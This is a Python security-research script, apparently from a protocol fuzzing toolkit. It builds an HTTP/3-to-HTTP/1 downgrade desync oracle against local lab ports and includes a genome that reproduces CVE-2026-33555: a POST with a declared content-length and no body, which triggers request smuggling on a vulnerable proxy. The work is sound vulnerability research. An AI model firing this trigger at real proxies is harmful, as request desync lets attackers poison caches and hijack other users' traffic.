"""H3->H1 downgrade desync oracle (tap-based). Fire a genome via real H3 at the edge;
read the tap (edge->origin H1 bytes); a desync = the forwarded request declares a
Content-Length that does NOT match the body bytes actually delivered (the CVE-2026-33555
invariant: declared length != delivered length). Reusable for the hunt. Sentinel:
the CVE genome must fire on vuln (4434) and stay clean on patched (4433)."""
import asyncio, os, ssl, sys, time
sys.path.insert(0, "/home/j4kuuu/Desktop/tools/QuicDrawH3/src")
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.quic.configuration import QuicConfiguration
from phage.evo import genome as G
from phage.evo.driver import drive

TAP = "logs/tap_eo.jsonl"
CRLF = b"\r\n"


def size(p):
    try: return os.path.getsize(p)
    except OSError: return 0


async def _fire(port, genome, raw):
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    async with connect("127.0.0.1", port, configuration=cfg) as client:
        http = H3Connection(client._quic)
        sid = client._quic.get_next_available_stream_id()
        await drive(http, client._quic, sid, genome, transmit=client.transmit, raw=raw)
        await asyncio.sleep(0.3)


def declared_delivered(fwd):
    """(declared CL, delivered body length) for the forwarded request."""
    head, sep, body = fwd.partition(CRLF + CRLF)
    if not sep:
        return None, 0
    cl = None
    for line in head.split(CRLF):
        if line.lower().startswith(b"content-length"):
            try: cl = int(line.split(b":", 1)[1].strip())
            except ValueError: cl = None
    return cl, len(body)


def probe(port, genome, raw=True):
    off = size(TAP)
    try:
        asyncio.new_event_loop().run_until_complete(_fire(port, genome, raw))
    except Exception:
        pass
    time.sleep(0.4)
    try:
        with open(TAP, "rb") as f:
            f.seek(off); fwd = f.read()
    except OSError:
        fwd = b""
    cl, body = declared_delivered(fwd)
    desync = cl is not None and cl > body
    return dict(fwd_len=len(fwd), cl=cl, body=body, desync=desync,
                rl=fwd.split(CRLF, 1)[0][:50])


def CVE_genome(cl=10):
    return [G.Headers(((b":method", b"POST"), (b":scheme", b"https"),
                       (b":authority", b"lab"), (b":path", b"/evil"),
                       (b"content-length", str(cl).encode())), end_stream=False),
            G.Fin()]


if __name__ == "__main__":
    print("SENTINEL: can a Phage GENOME reproduce CVE-2026-33555 via the driver?")
    print("  benign (seed_post) vuln  :", probe(4434, G.seed_post(body=b"AAAA")))
    print("  CVE-genome        vuln   :", probe(4434, CVE_genome(10)))
    print("  CVE-genome        PATCHED:", probe(4433, CVE_genome(10)))
